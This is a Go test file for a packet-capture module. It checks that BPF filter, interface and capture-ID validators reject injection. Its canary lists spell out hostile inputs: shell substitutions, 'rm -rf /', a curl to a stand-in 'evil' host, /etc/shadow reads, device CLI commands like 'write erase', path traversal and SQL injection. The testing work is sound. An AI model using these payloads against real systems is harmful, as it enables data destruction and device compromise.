package pcap

import (
	"strings"
	"testing"
)

// bpf_test.go — the grammar is the injection boundary, so it gets the most
// hostile test in the module. Every canary below is a real technique: shell
// command substitution, statement separators, pipes, redirection, quote
// breakout, newline injection into a device CLI, and comment-out.

func TestBPFGrammarAcceptsValidFilters(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"host 10.1.2.3", "host 10.1.2.3"},
		{"HOST 10.1.2.3", "host 10.1.2.3"},
		{"net 10.0.0.0/8", "net 10.0.0.0/8"},
		{"port 443", "port 443"},
		{"portrange 1000-2000", "portrange 1000-2000"},
		{"tcp and port 22", "tcp and port 22"},
		{"tcp   and    port 22", "tcp and port 22"},
		{"udp or icmp", "udp or icmp"},
		{"not port 22", "not port 22"},
		{"(tcp and port 80) or (udp and port 53)", "( tcp and port 80 ) or ( udp and port 53 )"},
		{"src host 10.1.2.3 and dst port 443", "src host 10.1.2.3 and dst port 443"},
		{"host 2001:db8::1", "host 2001:db8::1"},
		{"net 2001:db8::/32", "net 2001:db8::/32"},
		{"vlan 100", "vlan 100"},
		{"ip6 and tcp", "ip6 and tcp"},
		{"", ""},
		{"   ", ""},
	} {
		got, err := ValidateFilter(tc.in)
		if err != nil {
			t.Errorf("ValidateFilter(%q) = error %v, want it accepted", tc.in, err)
			continue
		}
		if got != tc.want {
			t.Errorf("ValidateFilter(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// injectionCanaries are the payloads that must NEVER survive validation. If any
// one of these is accepted, a rendered command carries an operator-supplied
// shell/CLI construct to a production device.
var injectionCanaries = []string{
	"host 1.2.3.4; rm -rf /",
	"host 1.2.3.4 && reboot",
	"host 1.2.3.4 | sh",
	"host $(reboot)",
	"host `reboot`",
	"host ${IFS}reboot",
	"host 1.2.3.4\nconfigure terminal",
	"host 1.2.3.4\rreload",
	"host 1.2.3.4 > /etc/passwd",
	"host 1.2.3.4 < /etc/shadow",
	`host 1.2.3.4" ; reload ; "`,
	"host 1.2.3.4' ; reload ; '",
	"host 1.2.3.4 # comment",
	"host 1.2.3.4 -- comment",
	`host 1.2.3.4\; reload`,
	"host *",
	"host ../../etc/passwd",
	"port 22 ; write erase",
	"tcp && curl http://evil/x",
	"host 1.2.3.4 $USER",
	"host 1.2.3.4%0Areload",
	"exec reload",
	"bash -c id",
	"host 1.2.3.4 and system",
	"' OR 1=1 --",
	"host 999.999.999.999",
	"port 70000",
	"port -1",
	"port +80",
	"portrange 2000-1000",
	"net 10.0.0.0/99",
	"vlan 9999",
	"host",
	"and host 1.2.3.4",
	"host 1.2.3.4 and",
	"(host 1.2.3.4",
	"host 1.2.3.4)",
	"src and dst",
	"tcp tcp",
	"not",
}

func TestBPFGrammarRejectsInjectionCanaries(t *testing.T) {
	for _, canary := range injectionCanaries {
		got, err := ValidateFilter(canary)
		if err == nil {
			t.Errorf("INJECTION ACCEPTED: ValidateFilter(%q) returned %q with no error", canary, got)
		}
		if got != "" {
			t.Errorf("ValidateFilter(%q) returned %q alongside an error — a refused filter must yield nothing", canary, got)
		}
	}
}

func TestBPFGrammarRejectsOverlongFilter(t *testing.T) {
	long := "host 10.1.2.3 and " + strings.Repeat("port 80 and ", 200) + "port 81"
	if _, err := ValidateFilter(long); err == nil {
		t.Fatal("an over-length filter was accepted — the §9 bound is not enforced")
	}
	// Just under the character cap but with too many terms.
	many := strings.TrimSuffix(strings.Repeat("tcp or ", 40), " or ")
	if len(many) <= MaxFilterLen {
		if _, err := ValidateFilter(many); err == nil {
			t.Fatal("a filter with too many terms was accepted")
		}
	}
}

func TestInterfaceGrammar(t *testing.T) {
	for _, ok := range []string{
		"GigabitEthernet0/0/1", "Ethernet1/1", "ge-0/0/0.100", "xe-0/0/0:1",
		"et1", "Vlan100", "Port-Channel1", "eth0",
	} {
		if _, err := ValidateInterface(ok); err != nil {
			t.Errorf("ValidateInterface(%q) = %v, want accepted", ok, err)
		}
	}
	for _, bad := range []string{
		"", "  ", "0/0", "-eth0", "eth0; reboot", "eth0 && id", "eth0|sh",
		"eth0`id`", "eth0$(id)", "eth0\nreload", "eth0 eth1", "../../etc/passwd",
		"eth0'", `eth0"`, "eth0*", strings.Repeat("e", MaxInterfaceLen+1),
	} {
		if got, err := ValidateInterface(bad); err == nil {
			t.Errorf("INJECTION ACCEPTED: ValidateInterface(%q) returned %q", bad, got)
		}
	}
}

func TestCaptureIDGrammar(t *testing.T) {
	if !ValidateCaptureID("0123456789abcdef0123456789abcdef") {
		t.Fatal("a well-formed capture id was rejected")
	}
	for _, bad := range []string{
		"", "short", "0123456789ABCDEF0123456789ABCDEF", // upper hex is not the minted spelling
		"0123456789abcdef0123456789abcde", "0123456789abcdef0123456789abcdefg",
		"../../../etc/passwd", "0123456789abcdef0123456789abcde/",
	} {
		if ValidateCaptureID(bad) {
			t.Errorf("ValidateCaptureID(%q) = true, want false", bad)
		}
	}
}
